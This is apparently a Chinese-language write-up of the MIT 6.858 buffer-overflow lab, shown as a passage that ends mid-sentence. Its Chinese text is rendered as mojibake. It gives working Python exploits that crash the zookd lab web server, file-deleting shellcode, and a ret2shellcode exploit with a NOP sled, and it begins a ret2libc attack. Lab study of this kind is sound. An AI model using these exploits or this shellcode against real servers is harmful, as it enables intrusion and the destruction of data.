class="hljs-built_in">toupper</span>(buf[i]);<br>    <span class="hljs-keyword">if</span> (buf[i] == <span class="hljs-string">&#x27;-&#x27;</span>)<br>        buf[i] = <span class="hljs-string">&#x27;_&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">/* Decode URL escape sequences in the value */</span><br>url_decode(value, sp);<br></code></pre></td></tr></table></figure><p>æœ€åéƒ¨åˆ†å°±æ˜¯å¦‚æœ <code>key</code> ä¸ä¸º <code>CONTENT_TYPE</code> æˆ– <code>CONTENT_LENGTH</code> åˆ™åœ¨å‰é¢åŠ ä¸Šå­—ç¬¦ä¸² <code>HTTP_</code> åå­˜å‚¨åˆ° <code>envvar</code> ä¸­ï¼Œå¹¶è°ƒç”¨ <code>setenv()</code> è®¾ç½®  <em>ç¯å¢ƒå˜é‡</em>  ä¸­çš„å¯¹åº”å€¼</p><ul><li>è¿™é‡Œæˆ‘ä»¬æ³¨æ„åˆ° <code>envvar</code> ä¹Ÿæ˜¯ä¸€ä¸ª<strong>ä½äºå‡½æ•°æ ˆä¸Šçš„é•¿åº¦ä»…ä¸º 512çš„å­—ç¬¦æ•°ç»„</strong>ï¼Œå› æ­¤åœ¨è¿™é‡Œä¹Ÿå¯ä»¥å‘ç”Ÿ<strong>æ ˆæº¢å‡º</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">        <span class="hljs-comment">/* Store header in env. variable for application code */</span><br>        <span class="hljs-comment">/* Some special headers don&#x27;t use the HTTP_ prefix. */</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;CONTENT_TYPE&quot;</span>) != <span class="hljs-number">0</span> &amp;&amp;<br>            <span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;CONTENT_LENGTH&quot;</span>) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">sprintf</span>(envvar, <span class="hljs-string">&quot;HTTP_%s&quot;</span>, buf);<br>            setenv(envvar, value, <span class="hljs-number">1</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            setenv(buf, value, <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆä¸‹é¢æˆ‘ä»¬æ¥åˆ° Exercise2ï¼Œå†™ä¸€ä¸ª exp æ¥è®© zookd ç¨‹åº crash æ‰ï¼š</p><blockquote><p><strong>Exercise 2.</strong> Write an exploit that uses a buffer overflow to crash the web server (or one of the processes it creates). You do not need to inject code at this point. Verify that your exploit crashes the server by checking the last few lines of <code>dmesg | tail</code>, using <code>gdb</code>, or observing that the web server crashes (i.e., it will print <code>Child process 9999 terminated incorrectly, receiving signal 11</code>)</p><p>Provide the code for the exploit in a file called <code>exploit-2.py</code>.</p><p>The vulnerability you found in Exercise 1 may be too hard to exploit. Feel free to find and exploit a different vulnerability.</p></blockquote><p>æˆ‘ä»¬ç°åœ¨æ¥æµ‹è¯•ä¸€ä¸‹è¿™ä¸ªæ¼æ´ï¼Œé¦–å…ˆç¼–å†™ä¸€ä¸ªæ­£å¸¸çš„ HTTP Get è¯·æ±‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">host, port</span>):<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((host, <span class="hljs-built_in">int</span>(port)))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + <span class="hljs-string">b&quot;rat3bant&quot;</span> + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: &#123;&#125; host port&quot;</span>.<span class="hljs-built_in">format</span>(sys.argv[<span class="hljs-number">0</span>]))<br>        exit(-<span class="hljs-number">1</span>)<br>    exp(sys.argv[<span class="hljs-number">1</span>], sys.argv[<span class="hljs-number">2</span>])<br></code></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/11/29/PujgG7EJVMmOiz1.png" alt="image.png"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°è¯•åˆ©ç”¨ <code>envvar</code> è¿›è¡Œæº¢å‡ºæµ‹è¯•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + <span class="hljs-string">b&quot;rat3bant&quot;</span> * <span class="hljs-number">512</span> + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° zookd æç¤ºäº†å­è¿›ç¨‹æ”¶åˆ°äº† <code>signal 11</code>ï¼ˆä¹Ÿå°±æ˜¯ <code>SIGSEGV</code>ï¼‰ï¼ŒåŒæ—¶æˆ‘ä»¬æ”¶åˆ°çš„å“åº”ä¹Ÿä¸ºç©ºå­—ç¬¦ä¸²ï¼Œè¯´æ˜æˆ‘ä»¬æˆåŠŸè§¦å‘äº†è¿™ä¸ªæ¼æ´</p><p><img src="https://s2.loli.net/2022/12/03/oWwStCVeFG5Qd6Z.png" alt="image.png"></p><blockquote><p>MIT å…¶å®è¿˜è´´å¿ƒåœ°æä¾›äº†ä¸€ä¸ª <code>exploit-template.py</code> æ–‡ä»¶ï¼Œè®©ç¬”è€…è¿™ç§ä¸æ€ä¹ˆä¼šç”¨ socket å†™è£¸ HTTP è¯·æ±‚çš„èœé¸¡å¯ä»¥å‚è€ƒï¼ˆç¬‘ï¼‰ï¼Œ<del>ä»–çœŸçš„ğŸ‘´å“­æ­»</del></p></blockquote><p>å°†æ–‡ä»¶åæ”¹æˆ <code>exploit-2.py</code> åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œè¯„æµ‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-crash</span><br></code></pre></td></tr></table></figure><p>è¯„æµ‹çš„åŸç†æ˜¯æ£€æŸ¥ <code>/tmp/strace.log</code> å½“ä¸­æ˜¯å¦æœ‰ <code>SIGSEGV</code> å­—ç¬¦ä¸²ï¼Œç¬”è€…ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆåæ­£ç¬”è€…ç”µè„‘ä¸Šæ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥è¿™é‡Œå°±è·³è¿‡äº†ï¼ˆ<del>ğŸ‘´çš„è¯„ä»·æ˜¯ğŸ”ˆâ†‘â†“</del>ï¼‰</p><blockquote><p>ä½†æ˜¯æ¯”è¾ƒ SB çš„æ˜¯è¯„æµ‹ç”¨çš„æ˜¯ MIT ç¼–è¯‘çš„ zookd è€Œä¸æ˜¯æˆ‘ä»¬è‡ªè¡Œç¼–è¯‘çš„ï¼Œç„¶åä»–å°±ä¼šç»™ğŸ‘´æŠ¥è¿™ç§SBé”™è¯¯ï¼š</p><p><img src="https://s2.loli.net/2022/11/29/Fs1Ka4xTNtWXPrq.png" alt="image.png"></p><p>ç„¶åğŸ‘´è‡ªå·±å†é‡æ–°è¯•ç€è·‘ zookd ä¼šå‘ç°ï¼Œ<del>å› ä¸ºğŸ‘´çš„å­¦ç”ŸğŸ“æ˜¯è€æ—§çš„ Ubuntu20ï¼ŒğŸ‘´çš„è¯„ä»·æ˜¯ğŸ”ˆâ†‘â†“</del>ï¼š</p><p><img src="https://s2.loli.net/2022/11/29/uBRnHQ4lMjfwLrU.png" alt="image.png"></p><p>æœ€åç¬”è€…çš„è§£å†³æ–¹æ¡ˆæ˜¯æ‹‰äº†ä¸€ä¸ª Ubuntu 22.04 çš„å®¹å™¨åœ¨é‡Œé¢åšâ€¦</p></blockquote><h2 id="Part-2-Code-injection"><a href="#Part-2-Code-injection" class="headerlink" title="Part 2: Code injection"></a>Part 2: Code injection</h2><p>è¿™ä¸€éƒ¨åˆ†ä¸»è¦æ˜¯è®©æˆ‘ä»¬è¿›è¡Œä»£ç æ³¨å…¥æ¥åˆ æ‰æœåŠ¡å™¨ä¸Šçš„ <code>/home/student/grades.txt</code> æ–‡ä»¶ï¼ˆè‡ªå·±åˆ›ä¸€ä¸ªå°±è¡Œï¼‰ï¼Œè¦æ±‚æˆ‘ä»¬ä½¿ç”¨æ ˆå…·æœ‰å¯æ‰§è¡Œæƒé™çš„ <code>zookd-exstack</code>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./clean-env.sh ./zookd-exstack 8080</span><br></code></pre></td></tr></table></figure><p>å®éªŒè¿˜ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä»½ shellcode æ¨¡æ¿ <code>shellcode.S</code>ï¼Œå½“æˆ‘ä»¬ <code>make</code> çš„æ—¶å€™å…¶ä¼šè¢«ç¼–è¯‘æˆ <code>shellcode.bin</code>ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>run-shellcode</code> æ¥éªŒè¯å…¶åŠŸèƒ½æ€§ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./run-shellcode shellcode.bin</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯ Exercise3ï¼Œä¿®æ”¹ shellcode ä½¿å…¶èƒ½åˆ é™¤  <code>/home/student/grades.txt</code>ï¼š</p><blockquote><p><strong>Exercise 3 (warm-up).</strong> Modify <code>shellcode.S</code> to unlink <code>/home/student/grades.txt</code>. Your assembly code can either invoke the <code>SYS_unlink</code> system call, or call the <code>unlink()</code> library function.</p></blockquote><p>é‡Œè¾¹æ˜¯<del>ä¸‘é™‹çš„</del> AT&amp;T æ±‡ç¼–ï¼Œç¬”è€…é€‰æ‹©ç›´æ¥é‡å†™ä¸€ä»½ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.globl main<br>.typemain, @function<br><br> main:<br>/* store the string on the stack */<br>xorq  %rax, %rax<br>pushq %rax<br>movq  $0x7478742e73656461, %rax /* &quot;ades.txt&quot; */<br>pushq %rax<br>movq  $0x72672f746e656475, %rax /* &quot;udent/gr&quot; */<br>pushq %rax<br>movq  $0x74732f656d6f682f, %rax /* &quot;/home/st&quot; */<br>pushq %rax<br><br>/* unlink(rsp) */<br>pushq %rsp<br>popq  %rdi<br>movq  $87, %rax /* SYS_unlink */<br>syscall<br><br>/* exit() */<br>xorq  %rdi, %rdi<br>movq  $60, %rax/* SYS_exit */<br>syscall<br><br></code></pre></td></tr></table></figure><p>æˆåŠŸåˆ é™¤æ–‡ä»¶ï¼š</p><p><img src="https://s2.loli.net/2022/12/03/FX8UsCbyW72fOtw.png" alt="image.png"></p><p>ä¹‹åå®éªŒæ–‡ä»¶æç¤ºæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ strace æ¥è·Ÿè¸ª zookd æ‰€ä½¿ç”¨çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆéœ€è¦rootï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">strace -f -p $(pgrep zookd-)</span><br></code></pre></td></tr></table></figure><p>æ¯”å¦‚è¯´ç¬”è€…å…ˆèµ·ä¸€ä¸ª zookd å†è¿è¡Œ straceï¼Œä¹‹åç”¨å‰é¢çš„ exp æ‰“ä¸€ä¸‹ zookd å°±å¯ä»¥çœ‹åˆ°ï¼š</p><p><img src="https://s2.loli.net/2022/12/03/oKDm5yIjCin6OpG.png" alt="image.png"></p><p>å‰é¢çš„è¯„æµ‹åº”è¯¥æ˜¯åŸºäºè¿™ä¸ªå®Œæˆçš„ï¼Œä½†æ˜¯ç¬”è€…å‘ç°åœ¨ <code>/tmp/strace.log</code> å½“ä¸­ä¸ä¼šè®°å½• <code>SIGSEGV</code> å­—ç¬¦ä¸²ï¼Œ<del>ğŸ‘´ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆæ‰€ä»¥è¿™é‡Œå°±å…ˆâ‘§ç®¡äº†</del></p><p><img src="https://s2.loli.net/2022/12/03/GkpjiZWb71HyhD3.png" alt="image.png"></p><p>ä»¥åŠæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ gdb è¿›è¡Œè°ƒè¯•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gdb -p $(pgrep zookd-)</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/03/M8HgfPEkdl2Vypi.png" alt="image.png"></p><p>ä¹‹åå®éªŒæ‰‹å†Œæ‰¯äº†ä¸€å †æ€ä¹ˆè°ƒè¯•ï¼Œè¿™é‡Œå°±ä¸ç®¡äº†ï¼Œä¸‹é¢æ¥çœ‹ Exercise 4ï¼Œå¤§æ¦‚æ˜¯è®©æˆ‘ä»¬ç”¨ ret2shellcode æ¥æ‰“ zookd</p><blockquote><p><strong>Exercise 4.</strong> Starting from one of your exploits from Exercise 2, construct an exploit that hijacks the control flow of the web server and unlinks <code>/home/student/grades.txt</code>. Save this exploit in a file called <code>exploit-4.py</code>.</p><p>Verify that your exploit works; you will need to re-create <code>/home/student/grades.txt</code> after each successful exploit run.</p><p>Suggestion: first focus on obtaining control of the program counter. Sketch out the stack layout that you expect the program to have at the point when you overflow the buffer, and use <code>gdb</code> to verify that your overflow data ends up where you expect it to. Step through the execution of the function to the return instruction to make sure you can control what address the program returns to. The <code>next</code>, <code>stepi</code>, and <a href="https://visualgdb.com/gdbreference/commands/x"><code>x</code></a> commands in <code>gdb</code> should prove helpful.</p><p>Once you can reliably hijack the control flow of the program, find a suitable address that will contain the code you want to execute, and focus on placing the correct code at that addressâ€”e.g. a derivative of the provided shell code.</p></blockquote><p>å› ä¸ºæ²¡æœ‰å¼€ ASLR è€Œä¸”æ ˆå…·æœ‰å¯æ‰§è¡Œæƒé™ï¼Œé‚£ä¹ˆç¬”è€…ç›´æ¥ç”¨ <code>nop</code> ä½œä¸º slide code å¹¶åœ¨æ ˆä¸Šé åçš„ä½ç½®å¸ƒç½® shellcode å³å¯ï¼Œè¿™é‡Œæ³¨æ„åˆ«å¿˜äº†æŠŠ shellcode å½“ä¸­çš„ <code>\x00</code> ç¼–ç æˆ <code>%00</code> å¦åˆ™ä¼šè¢«è¿‡æ»¤æ‰</p><blockquote><p>ç¼–å†™ shellcode æ˜¯ pwn æ‰‹æœ€åŸºç¡€çš„æŠ€èƒ½ï¼Œå¦‚æœä½ ä¸ä¼šçš„è¯â€¦â€¦  ï¼šï¼‰</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>shellcode_text = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    /* push string */</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rax, 0x7478742e73656461</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rax, 0x72672f746e656475</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rax, 0x74732f656d6f682f</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* print the string */</span><br><span class="hljs-string">    mov rdx, 25</span><br><span class="hljs-string">    push rsp</span><br><span class="hljs-string">    pop rsi</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* remove the file */</span><br><span class="hljs-string">    push rsp</span><br><span class="hljs-string">    pop rdi</span><br><span class="hljs-string">    mov rax, 87</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /* exit normally */</span><br><span class="hljs-string">    xor rdi, rdi</span><br><span class="hljs-string">    mov rax, 60</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    shellcode = asm(<span class="hljs-string">&#x27;nop&#x27;</span>) * <span class="hljs-number">4096</span> + asm(shellcode_text)<br>    payload = (p64(<span class="hljs-number">0x7fffffffe000</span>) * <span class="hljs-number">128</span> + shellcode).replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br>    req  = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + payload + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(req)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>ç¬”è€…ç¼–å†™çš„ shellcode å½“ä¸­æœ‰ <code>exit(0)</code> æ‰€ä»¥ä¸ä¼šæŠ¥ SIGSEGVï¼Œä½†æ˜¯æœ‰ä¸ªæ‰“å°å­—ç¬¦ä¸²çš„æ“ä½œè®©æˆ‘ä»¬å¯ä»¥ç›´è§‚åœ°çœ‹åˆ°ä»£ç æ‰§è¡ŒæˆåŠŸï¼Œå¦‚æœä½ æƒ³çœ‹ SIGSEGV ä¹Ÿå¯ä»¥æŠŠæœ€åçš„ exit ä»£ç å»æ‰ï¼šï¼‰</p><p><img src="https://s2.loli.net/2022/12/03/2BrKMLp4vlESICT.png" alt="image.png"></p><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œæµ‹è¯„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check-exstack</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡</p><p><img src="https://s2.loli.net/2022/12/03/AkztJ2qahmWZuOo.png" alt="image.png"></p><h2 id="Part-3-Return-to-libc-attacks"><a href="#Part-3-Return-to-libc-attacks" class="headerlink" title="Part 3: Return-to-libc attacks"></a>Part 3: Return-to-libc attacks</h2><p>æ¥ä¸‹æ¥ç»ˆäºåˆ°äº†<del>å¤§ä¸€å°æœ‹å‹éƒ½ä¼šçš„</del> ret2libc æ”»å‡»çš„éƒ¨åˆ†ï¼Œè¿™ä¸€æ¬¡æˆ‘ä»¬éœ€è¦ä½¿ç”¨æ ˆä¸å…·æœ‰å¯æ‰§è¡Œæƒé™çš„ <code>zookd-nxstack</code> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./clean-env.sh ./zookd-nxstack 8080</span><br></code></pre></td></tr></table></figure><p><strong>è¿”å›å¯¼å‘ç¼–ç¨‹</strong>ï¼ˆreturn-oriented programmingï¼Œ <strong>ROP</strong>ï¼‰æ˜¯ç”¨æ¥çªç ´åŒ…æ‹¬ ASLRã€æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤åœ¨å†…çš„æœ€ä¸ºç»å…¸çš„æ”»å‡»æ‰‹æ³•ï¼Œ<del>ä½ è¦æ˜¯ä¸ä¼šğŸ‘´ä¹Ÿâ‘§æ•™ä½ ï¼Œè‡ªå·±å­¦å»</del>ï¼Œ<code>ret2libc</code> æŒ‡çš„åˆ™æ˜¯åˆ©ç”¨ libc ä¸­çš„ gadget æ¥å®Œæˆ ROP chain çš„æ„å»º</p><p>å®éªŒæ‰‹å†Œä¸­é—´çš„ä¸€å †ä»‹ç»å’Œè¯´æ˜ç›´æ¥è·³äº†ï¼Œ<del>æ²¡å•¥æ„æ€</del>ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¤§è¸æ­¥è¿›å…¥ Exercise 5ï¼šç”¨ <code>ret2libc</code> è¿™ä¸€æ”»å‡»æ‰‹æ³•æ¥å®Œæˆå¯¹ zookd çš„æ”»å‡»</p><blockquote><p><strong>Exercise 5.</strong> Starting from your exploit in Exercises 2 and 4, construct an exploit that unlinks <code>/home/student/grades.txt</code> when run on the binaries that have a non-executable stack. Name this new exploit <code>exploit-5.py</code>.</p><p>In this attack you are going to take control of the server over the network <em>without injecting any code</em> into the server. You should use a return-to-libc attack where you redirect control flow to code that already existed before your attack. The outline of the attack is to perform a buffer overflow that:</p><ol><li>causes the argument to the chosen libc function to be on stack</li><li>then causes <code>accidentally</code> to run so that argument ends up in <code>%rdi</code></li><li>and then causes <code>accidentally</code> to return to the chosen libc function</li></ol><p>It will be helpful to draw a stack diagram like the figures in <a href="https://thesquareplanet.com/blog/smashing-the-stack-21st-century/">Smashing the Stack in the 21st Century</a> at (1) the point that the buffer overflows and (2) at the point that <code>accidentally</code> runs.</p></blockquote><p>é¦–å…ˆ <code>checksec</code> ï¼Œé™¤äº† canary ä»¥å¤–çš„ä¿æŠ¤éƒ½å¼€äº†â€¦</p><p><img src="https://s2.loli.net/2022/12/03/M5TCnY6tDLNB2Fa.png" alt="image.png"></p><p>å¼€äº† PIE æ¯”è¾ƒéš¾å¼„ï¼Œè™½ç„¶æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ partial overwrite çš„æ–¹å¼æ¥åœ¨ text æ®µçš„åŒä¸€å¼ é¡µé¢ä¸Šè¿›è¡Œä¸€æ¬¡è·³è½¬ï¼Œä¸è¿‡æˆ‘ä»¬è¿˜ä¸çŸ¥é“æˆ‘ä»¬çš„å‚æ•°åˆ° <code>http_request_headers()</code> æ 